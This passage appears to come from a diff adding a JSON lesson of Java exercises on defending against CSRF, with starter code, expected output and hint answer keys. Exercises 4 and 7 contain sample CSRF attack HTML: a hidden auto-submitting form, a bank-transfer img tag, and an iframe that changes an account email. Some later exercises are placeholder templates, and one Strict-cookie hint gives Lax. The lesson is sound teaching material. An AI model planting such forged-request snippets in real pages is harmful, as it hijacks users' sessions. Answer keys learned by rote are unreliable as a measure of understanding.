bold;\">1.</span> CSRF = attacker uses YOUR session via YOUR browser\n  <span style=\"color: #f39c12; font-weight: bold;\">2.</span> Cookies are sent AUTOMATICALLY -- that is the problem\n  <span style=\"color: #2ecc71; font-weight: bold;\">3.</span> CSRF tokens: generate (SecureRandom) -> store (session) -> embed (form) -> validate (POST)\n  <span style=\"color: #3498db; font-weight: bold;\">4.</span> SameSite=Lax blocks most CSRF (modern browsers)\n  <span style=\"color: #9b59b6; font-weight: bold;\">5.</span> Never use GET for state-changing actions\n  <span style=\"color: #1abc9c; font-weight: bold;\">6.</span> Defence in depth: tokens + SameSite + Origin check + re-auth\n  <span style=\"color: #e67e22; font-weight: bold;\">7.</span> XSS defeats CSRF -- fix XSS first!\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: What Makes CSRF Possible?",
+          "description": "Fill in the blanks to explain why CSRF works.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us start with the fundamentals -- WHY does CSRF work?",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Fill in each blank with the correct answer\n        \n        String blank1 = \"\"; // What does the browser send automatically with every request to a domain?\n        String blank2 = \"\"; // Can the attacker see the victim's cookie value? (yes/no)\n        String blank3 = \"\"; // Can the attacker make the browser SEND the cookie? (yes/no)\n        String blank4 = \"\"; // What HTTP method should NEVER change state?\n        \n        System.out.println(\"CSRF works because: \" + blank1 + \" are sent automatically\");\n        System.out.println(\"Attacker can see cookie: \" + blank2);\n        System.out.println(\"Attacker can use cookie: \" + blank3);\n        System.out.println(\"Safe method: \" + blank4);\n    }\n}",
+          "expected_output": "CSRF works because: cookies are sent automatically\nAttacker can see cookie: no\nAttacker can use cookie: yes\nSafe method: GET",
+          "hints": [
+            {
+              "message": "Think about what your browser does when you visit any website. What gets attached to the request?"
+            },
+            {
+              "message": "Cookies are the answer to blank1. The key insight: the attacker cannot READ cookies but CAN make the browser SEND them."
+            },
+            {
+              "message": "blank1=\"cookies\"; blank2=\"no\"; blank3=\"yes\"; blank4=\"GET\"; -- The paradox of CSRF: attacker cannot see the cookie but can use it!"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Match the Attack to the Defence",
+          "description": "Connect each CSRF attack method to its defence.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "Different attacks need different defences. Let us match them up!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: For each attack, write the correct defence\n        // Options: csrf_token, samesite_cookie, origin_check, re_authentication\n        \n        String[] attacks = {\n            \"Hidden form auto-submits to bank.com\",\n            \"img tag triggers GET request to bank.com/transfer\",\n            \"AJAX POST from evil-site.com\",\n            \"CSRF on password change page\",\n            \"Cross-origin form submission\"\n        };\n        \n        String[] defences = {\"\", \"\", \"\", \"\", \"\"}; // TODO: fill these\n        \n        for (int i = 0; i < attacks.length; i++) {\n            System.out.println(\"Attack: \" + attacks[i]);\n            System.out.println(\"Defence: \" + defences[i]);\n            System.out.println();\n        }\n    }\n}",
+          "expected_output": "Attack: Hidden form auto-submits to bank.com\nDefence: csrf_token\n\nAttack: img tag triggers GET request\nDefence: never use GET for state changes\n\nAttack: AJAX POST from evil-site.com\nDefence: samesite_cookie + origin_check\n\nAttack: CSRF on password change page\nDefence: re_authentication\n\nAttack: Cross-origin form submission\nDefence: csrf_token + samesite_cookie",
+          "hints": [
+            {
+              "message": "Each attack exploits a different weakness. Think about what each defence prevents."
+            },
+            {
+              "message": "Hidden forms need tokens. GET transfers need HTTP method fix. AJAX needs origin checks. Password changes need re-auth."
+            },
+            {
+              "message": "defences = {\"csrf_token\", \"never use GET for state changes\", \"samesite_cookie + origin_check\", \"re_authentication\", \"csrf_token + samesite_cookie\"}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Identify the Vulnerable Code",
+          "description": "Find the CSRF vulnerability in this servlet.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 4,
+          "ai_intro": "Can you spot what is missing from this code?",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // This servlet processes a money transfer.\n        // What CSRF protection is missing?\n        \n        String code = \"\"\"\n            protected void doPost(HttpServletRequest request,\n                                  HttpServletResponse response) {\n                HttpSession session = request.getSession(false);\n                if (session == null) {\n                    response.sendRedirect(\"/login\");\n                    return;\n                }\n                String user = (String) session.getAttribute(\"user\");\n                String amount = request.getParameter(\"amount\");\n                String to = request.getParameter(\"to\");\n                processTransfer(user, to, amount);\n                response.getWriter().println(\"Transfer done!\");\n            }\n            \"\"\";\n        \n        // TODO: List ALL missing CSRF protections\n        System.out.println(\"Missing protection 1: \");\n        System.out.println(\"Missing protection 2: \");\n        System.out.println(\"Missing protection 3: \");\n    }\n}",
+          "expected_output": "Missing protection 1: No CSRF token validation\nMissing protection 2: No Origin/Referer header check\nMissing protection 3: No SameSite cookie attribute",
+          "hints": [
+            {
+              "message": "The code checks if the user is logged in, but does it check if the REQUEST was intentional?"
+            },
+            {
+              "message": "Three things are missing: (1) token check, (2) header check, (3) cookie attribute. The session check only confirms WHO, not WHETHER they intended the action."
+            },
+            {
+              "message": "println(\"Missing protection 1: No CSRF token validation\"); println(\"Missing protection 2: No Origin/Referer header check\"); println(\"Missing protection 3: No SameSite cookie attribute\");"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Trace the CSRF Attack",
+          "description": "Step through a CSRF attack and predict what happens at each stage.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 4,
+          "ai_intro": "Let us walk through the attack step by step!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Fill in what happens at each step\n        \n        System.out.println(\"=== CSRF Attack Trace ===\");\n        System.out.println();\n        System.out.println(\"Step 1: Alice logs into bank.com\");\n        System.out.println(\"  Browser receives: \"); // TODO: what cookie?\n        System.out.println();\n        System.out.println(\"Step 2: Alice visits evil-memes.com\");\n        System.out.println(\"  Hidden on page: \"); // TODO: what HTML?\n        System.out.println();\n        System.out.println(\"Step 3: Browser sends request to bank.com\");\n        System.out.println(\"  Includes: \"); // TODO: what is auto-attached?\n        System.out.println();\n        System.out.println(\"Step 4: Bank server receives request\");\n        System.out.println(\"  Bank sees: \"); // TODO: valid or invalid session?\n        System.out.println(\"  Bank does: \"); // TODO: what action?\n        System.out.println();\n        System.out.println(\"Step 5: Result\");\n        System.out.println(\"  Alice: \"); // TODO: what does Alice know?\n        System.out.println(\"  Attacker: \"); // TODO: what did attacker gain?\n    }\n}",
+          "expected_output": "=== CSRF Attack Trace ===\n\nStep 1: Alice logs into bank.com\n  Browser receives: Set-Cookie: JSESSIONID=abc123\n\nStep 2: Alice visits evil-memes.com\n  Hidden on page: <form action='bank.com/transfer' method='POST'>...\n\nStep 3: Browser sends request to bank.com\n  Includes: Cookie: JSESSIONID=abc123 (automatic!)\n\nStep 4: Bank server receives request\n  Bank sees: valid session for Alice\n  Bank does: processes transfer to attacker's account\n\nStep 5: Result\n  Alice: knows nothing -- still looking at memes\n  Attacker: received $1000 from Alice",
+          "hints": [
+            {
+              "message": "At Step 1, what does the browser store? At Step 3, what does the browser automatically attach?"
+            },
+            {
+              "message": "The cookie (JSESSIONID) is the key. The browser sends it with ALL requests to bank.com, even from evil-memes.com."
+            },
+            {
+              "message": "Step 1: Set-Cookie: JSESSIONID=abc123. Step 2: hidden form to bank.com. Step 3: Cookie auto-attached. Step 4: valid session, processes transfer. Step 5: Alice unaware, attacker gets money."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: CSRF Quiz: True or False",
+          "description": "Test your understanding of CSRF fundamentals.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "Quick knowledge check -- true or false?",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Replace each \"???\" with \"true\" or \"false\"\n        \n        System.out.println(\"1. CSRF can steal the victim's password: \" + \"???\");\n        System.out.println(\"2. CSRF requires the victim to be logged in: \" + \"???\");\n        System.out.println(\"3. SSL/HTTPS prevents CSRF: \" + \"???\");\n        System.out.println(\"4. CSRF can work via an img tag: \" + \"???\");\n        System.out.println(\"5. SameSite=Strict blocks all CSRF: \" + \"???\");\n        System.out.println(\"6. The attacker needs the victim's cookie value: \" + \"???\");\n        System.out.println(\"7. GET requests should change state: \" + \"???\");\n        System.out.println(\"8. CSRF tokens must be cryptographically random: \" + \"???\");\n    }\n}",
+          "expected_output": "1. CSRF can steal the victim's password: false\n2. CSRF requires the victim to be logged in: true\n3. SSL/HTTPS prevents CSRF: false\n4. CSRF can work via an img tag: true\n5. SameSite=Strict blocks all CSRF: true\n6. The attacker needs the victim's cookie value: false\n7. GET requests should change state: false\n8. CSRF tokens must be cryptographically random: true",
+          "hints": [
+            {
+              "message": "CSRF performs actions, it does not steal data. Think about what the attacker CAN and CANNOT do."
+            },
+            {
+              "message": "Key facts: CSRF cannot read responses (so cannot steal passwords). It needs an active session. HTTPS encrypts the channel but does not prevent CSRF."
+            },
+            {
+              "message": "1=false, 2=true, 3=false, 4=true (GET request via img src), 5=true, 6=false (browser sends it automatically), 7=false, 8=true (predictable tokens can be guessed)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: Classify HTTP Methods",
+          "description": "Mark each as NEEDS_CSRF or NO_CSRF protection.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "Remember: state-changing methods need protection!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] methods = {\"GET /profile\", \"POST /transfer\", \"DELETE /account\",\n                           \"GET /search\", \"PUT /settings\", \"POST /login\",\n                           \"GET /image.jpg\", \"POST /change-email\"};\n        // TODO: Print NEEDS_CSRF or NO_CSRF for each\n        String[] answers = {\"\", \"\", \"\", \"\", \"\", \"\", \"\", \"\"};\n        for (int j = 0; j < methods.length; j++) {\n            System.out.println(methods[j] + \" -> \" + answers[j]);\n        }\n    }\n}",
+          "expected_output": "GET /profile -> NO_CSRF\nPOST /transfer -> NEEDS_CSRF\nDELETE /account -> NEEDS_CSRF\nGET /search -> NO_CSRF\nPUT /settings -> NEEDS_CSRF\nPOST /login -> NEEDS_CSRF\nGET /image.jpg -> NO_CSRF\nPOST /change-email -> NEEDS_CSRF",
+          "hints": [
+            {
+              "message": "GET = read-only = safe. POST/PUT/DELETE = state-changing = needs protection."
+            },
+            {
+              "message": "Even login needs CSRF protection (Login CSRF attack)."
+            },
+            {
+              "message": "answers = {\"NO_CSRF\",\"NEEDS_CSRF\",\"NEEDS_CSRF\",\"NO_CSRF\",\"NEEDS_CSRF\",\"NEEDS_CSRF\",\"NO_CSRF\",\"NEEDS_CSRF\"}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Spot the CSRF Attack HTML",
+          "description": "Which HTML snippets are CSRF attacks?",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 4,
+          "ai_intro": "Attackers hide CSRF in innocent-looking HTML!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] snippets = {\n            \"<img src='https://bank.com/transfer?amt=500&to=evil'>\",\n            \"<a href='https://bank.com/'>Visit Bank</a>\",\n            \"<form action='bank.com/delete' method='POST'><script>submit()</script></form>\",\n            \"<img src='cute-cat.jpg'>\",\n            \"<iframe src='bank.com/settings?email=evil@hack.com'>\"\n        };\n        // TODO: Mark each as CSRF_ATTACK or SAFE\n        String[] answers = {\"\", \"\", \"\", \"\", \"\"};\n        for (int j = 0; j < snippets.length; j++) {\n            System.out.println((j+1) + \". \" + answers[j]);\n        }\n    }\n}",
+          "expected_output": "1. CSRF_ATTACK\n2. SAFE\n3. CSRF_ATTACK\n4. SAFE\n5. CSRF_ATTACK",
+          "hints": [
+            {
+              "message": "CSRF triggers unwanted requests. Regular links and local images are safe."
+            },
+            {
+              "message": "img with bank URL = GET CSRF. Hidden form = POST CSRF. iframe with action URL = CSRF."
+            },
+            {
+              "message": "answers = {\"CSRF_ATTACK\",\"SAFE\",\"CSRF_ATTACK\",\"SAFE\",\"CSRF_ATTACK\"}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Cookie Attributes Quiz",
+          "description": "Match each cookie attribute to what it protects against.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "Each cookie flag stops a different attack!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Match attribute to protection\n        System.out.println(\"HttpOnly  -> protects against: \"); // XSS cookie theft / CSRF / sniffing?\n        System.out.println(\"Secure    -> protects against: \");\n        System.out.println(\"SameSite  -> protects against: \");\n        System.out.println(\"Max-Age   -> protects against: \");\n    }\n}",
+          "expected_output": "HttpOnly  -> protects against: XSS cookie theft\nSecure    -> protects against: network sniffing\nSameSite  -> protects against: CSRF\nMax-Age   -> protects against: session hijacking (limits time window)",
+          "hints": [
+            {
+              "message": "Each flag addresses a specific attack vector."
+            },
+            {
+              "message": "HttpOnly = JS cannot read. Secure = HTTPS only. SameSite = same origin only."
+            },
+            {
+              "message": "HttpOnly->XSS cookie theft, Secure->sniffing, SameSite->CSRF, Max-Age->long-lived sessions"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: Why Doesn't HTTPS Stop CSRF?",
+          "description": "Explain why encryption does not prevent CSRF.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 3,
+          "ai_intro": "This is a common misconception. Let us clear it up!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Fill in the explanation\n        System.out.println(\"HTTPS provides: \"); // What does it protect?\n        System.out.println(\"HTTPS does NOT prevent: \"); // What can still happen?\n        System.out.println(\"Reason: \"); // Why?\n        System.out.println();\n        System.out.println(\"Analogy: HTTPS is like \"); // Real-world comparison\n    }\n}",
+          "expected_output": "HTTPS provides: encrypted communication channel\nHTTPS does NOT prevent: forged requests from other sites\nReason: CSRF does not need to read the traffic -- it just sends requests\n\nAnalogy: HTTPS is like a secure phone line -- it prevents eavesdropping, but it cannot stop someone from dialling your number and placing a fake order",
+          "hints": [
+            {
+              "message": "HTTPS protects the CHANNEL. CSRF abuses the SESSION. Different things!"
+            },
+            {
+              "message": "The attacker does not need to intercept anything. They just trigger a request."
+            },
+            {
+              "message": "HTTPS=encrypted channel. CSRF=forged request using valid session. HTTPS cannot tell if a request was intended by the user or triggered by an attacker."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: CSRF Impact Assessment",
+          "description": "Rate the severity of CSRF on different endpoints.",
+          "difficulty": "beginner",
+          "category": "Understanding CSRF",
+          "estimated_minutes": 4,
+          "ai_intro": "Not all CSRF attacks are equally dangerous!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Rate each as LOW, MEDIUM, HIGH, or CRITICAL\n        String[][] endpoints = {\n            {\"POST /change-theme\", \"\"},\n            {\"POST /transfer-money\", \"\"},\n            {\"POST /change-password\", \"\"},\n            {\"POST /change-email\", \"\"},\n            {\"POST /add-to-cart\", \"\"},\n            {\"DELETE /delete-account\", \"\"},\n            {\"POST /post-comment\", \"\"},\n            {\"POST /admin/create-user\", \"\"}\n        };\n        for (String[] ep : endpoints) {\n            System.out.println(ep[0] + \" -> \" + ep[1]);\n        }\n    }\n}",
+          "expected_output": "POST /change-theme -> LOW\nPOST /transfer-money -> CRITICAL\nPOST /change-password -> CRITICAL\nPOST /change-email -> HIGH\nPOST /add-to-cart -> LOW\nDELETE /delete-account -> CRITICAL\nPOST /post-comment -> MEDIUM\nPOST /admin/create-user -> CRITICAL",
+          "hints": [
+            {
+              "message": "Think about what the attacker gains from each action."
+            },
+            {
+              "message": "Money transfers and credential changes are critical. Theme changes are low impact."
+            },
+            {
+              "message": "change-theme=LOW, transfer=CRITICAL, change-password=CRITICAL, change-email=HIGH (enables account takeover), add-to-cart=LOW, delete-account=CRITICAL, post-comment=MEDIUM, admin-create-user=CRITICAL"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Generate a CSRF Token",
+          "description": "Write a method that generates a cryptographically secure CSRF token.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to build CSRF token logic!",
+          "starter_code": "import java.security.SecureRandom;\nimport java.util.Base64;\n\npublic class Main {\n    // TODO: Write generateToken() method\n    // Requirements:\n    // - Use SecureRandom (not Math.random!)\n    // - Generate 32 random bytes\n    // - Encode as URL-safe Base64\n    // - Return the token string\n    \n    public static void main(String[] args) {\n        String token = generateToken();\n        System.out.println(\"Token: \" + token);\n        System.out.println(\"Length: \" + token.length());\n        System.out.println(\"Different each time: \" + !token.equals(generateToken()));\n    }\n}",
+          "expected_output": "Token: (43 random characters)\nLength: 43\nDifferent each time: true",
+          "hints": [
+            {
+              "message": "Start with SecureRandom random = new SecureRandom();"
+            },
+            {
+              "message": "byte[] bytes = new byte[32]; random.nextBytes(bytes); then Base64.getUrlEncoder().withoutPadding().encodeToString(bytes)"
+            },
+            {
+              "message": "static String generateToken() { SecureRandom r = new SecureRandom(); byte[] b = new byte[32]; r.nextBytes(b); return Base64.getUrlEncoder().withoutPadding().encodeToString(b); }"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Store Token in Session",
+          "description": "Simulate storing a CSRF token in a user session.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to build CSRF token logic!",
+          "starter_code": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class Main {\n    // Simulated session storage\n    static Map<String, String> session = new HashMap<>();\n    \n    // TODO: Write storeToken(token) -- saves token in session\n    // TODO: Write getToken() -- retrieves token from session\n    // TODO: Write clearToken() -- removes token from session\n    \n    public static void main(String[] args) {\n        String token = \"abc123secure\";\n        storeToken(token);\n        System.out.println(\"Stored: \" + getToken());\n        System.out.println(\"Has token: \" + (getToken() != null));\n        clearToken();\n        System.out.println(\"After clear: \" + getToken());\n    }\n}",
+          "expected_output": "Stored: abc123secure\nHas token: true\nAfter clear: null",
+          "hints": [
+            {
+              "message": "Use session.put(\"csrf_token\", token) to store."
+            },
+            {
+              "message": "getToken returns session.get(\"csrf_token\"). clearToken uses session.remove(\"csrf_token\")."
+            },
+            {
+              "message": "static void storeToken(String t){session.put(\"csrf_token\",t);} static String getToken(){return session.get(\"csrf_token\");} static void clearToken(){session.remove(\"csrf_token\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Validate CSRF Token",
+          "description": "Write constant-time token comparison.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to build CSRF token logic!",
+          "starter_code": "import java.security.MessageDigest;\n\npublic class Main {\n    // TODO: Write validateToken(sessionToken, formToken)\n    // Must handle: null sessionToken, null formToken, mismatch, match\n    // MUST use MessageDigest.isEqual for constant-time comparison\n    \n    public static void main(String[] args) {\n        System.out.println(\"Match: \" + validateToken(\"abc\", \"abc\"));\n        System.out.println(\"Mismatch: \" + validateToken(\"abc\", \"xyz\"));\n        System.out.println(\"Null form: \" + validateToken(\"abc\", null));\n        System.out.println(\"Null session: \" + validateToken(null, \"abc\"));\n        System.out.println(\"Both null: \" + validateToken(null, null));\n    }\n}",
+          "expected_output": "Match: true\nMismatch: false\nNull form: false\nNull session: false\nBoth null: false",
+          "hints": [
+            {
+              "message": "First check for nulls, then use MessageDigest.isEqual()."
+            },
+            {
+              "message": "if (sessionToken == null || formToken == null) return false; then MessageDigest.isEqual(sessionToken.getBytes(), formToken.getBytes())"
+            },
+            {
+              "message": "static boolean validateToken(String s, String f){if(s==null||f==null)return false; return MessageDigest.isEqual(s.getBytes(),f.getBytes());}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Build Hidden Form Field",
+          "description": "Generate HTML for a CSRF token hidden field.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 4,
+          "ai_intro": "Time to build CSRF token logic!",
+          "starter_code": "public class Main {\n    // TODO: Write generateHiddenField(token)\n    // Returns: <input type=\"hidden\" name=\"csrf_token\" value=\"TOKEN_HERE\">\n    // MUST escape the token value for HTML safety\n    \n    public static void main(String[] args) {\n        System.out.println(generateHiddenField(\"abc123\"));\n        System.out.println(generateHiddenField(\"token-with-quotes\\\"\"));\n    }\n}",
+          "expected_output": "<input type=\"hidden\" name=\"csrf_token\" value=\"abc123\">\n<input type=\"hidden\" name=\"csrf_token\" value=\"token-with-quotes&quot;\">",
+          "hints": [
+            {
+              "message": "String concatenation with the token value embedded."
+            },
+            {
+              "message": "Escape quotes: token.replace(\"\\\"\", \"&quot;\") to prevent HTML injection."
+            },
+            {
+              "message": "static String generateHiddenField(String t){String safe=t.replace(\"\\\"\",\"&quot;\"); return \"<input type=\\\"hidden\\\" name=\\\"csrf_token\\\" value=\\\"\"+safe+\"\\\">\";}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Token Regeneration",
+          "description": "Regenerate token after each valid request.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Token Regeneration\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Token Regeneration ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Token Regeneration ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Token Regeneration: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Per-Request vs Per-Session Tokens",
+          "description": "Compare the two token strategies.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 4,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Per-Request vs Per-Session Tokens\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Per-Request vs Per-Session Tokens ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Per-Request vs Per-Session Tokens ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Per-Request vs Per-Session Tokens: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Token in Meta Tag for AJAX",
+          "description": "Embed token in HTML meta tag for JavaScript.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Token in Meta Tag for AJAX\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Token in Meta Tag for AJAX ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Token in Meta Tag for AJAX ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Token in Meta Tag for AJAX: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Token Extraction from Meta Tag",
+          "description": "Write JavaScript-style logic to read token from meta.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 4,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Token Extraction from Meta Tag\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Token Extraction from Meta Tag ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Token Extraction from Meta Tag ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Token Extraction from Meta Tag: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: Multi-Tab Token Problem",
+          "description": "Handle token conflicts when user has multiple tabs.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 6,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Multi-Tab Token Problem\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Multi-Tab Token Problem ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Multi-Tab Token Problem ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Multi-Tab Token Problem: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Token Expiry System",
+          "description": "Add time-based expiry to CSRF tokens.",
+          "difficulty": "intermediate",
+          "category": "Token Implementation",
+          "estimated_minutes": 5,
+          "ai_intro": "Building robust token systems!",
+          "starter_code": "public class Main {\n    // TODO: Implement Token Expiry System\n    // This exercise builds on token generation and validation.\n    // Follow the hints for step-by-step guidance.\n    \n    public static void main(String[] args) {\n        System.out.println(\"=== Token Expiry System ===\");\n        // TODO: Add your implementation here\n    }\n}",
+          "expected_output": "=== Token Expiry System ===\n(Implementation-specific output)",
+          "hints": [
+            {
+              "message": "Start by thinking about what problem this solves."
+            },
+            {
+              "message": "For Token Expiry System: consider the security trade-offs and edge cases."
+            },
+            {
+              "message": "Review the complete CSRF filter example for the pattern to follow."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Set SameSite=Strict Cookie",
+          "description": "Configure a cookie with maximum CSRF protection.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Set SameSite=Strict Cookie ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Set SameSite=Strict Cookie ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Set SameSite=Strict Cookie: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Set SameSite=Lax Cookie",
+          "description": "Configure a balanced cookie for most applications.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Set SameSite=Lax Cookie ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Set SameSite=Lax Cookie ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Set SameSite=Lax Cookie: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Compare Strict vs Lax vs None",
+          "description": "Show behaviour differences between SameSite modes.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
+          "estimated_minutes": 5,
+          "ai_intro": "Cookies are the foundation of web security!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Compare Strict vs Lax vs None ===\");\n        // TODO: Implement the cookie configuration\n        // Remember: HttpOnly, Secure, SameSite, Path, Max-Age\n    }\n}",
+          "expected_output": "=== Compare Strict vs Lax vs None ===\n(Cookie configuration output)",
+          "hints": [
+            {
+              "message": "Start with the Set-Cookie header format."
+            },
+            {
+              "message": "For Compare Strict vs Lax vs None: think about which flags are needed and why."
+            },
+            {
+              "message": "Full secure cookie: JSESSIONID=...; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Full Cookie Security String",
+          "description": "Build a complete Set-Cookie header with all flags.",
+          "difficulty": "intermediate",
+          "category": "SameSite Cookies",
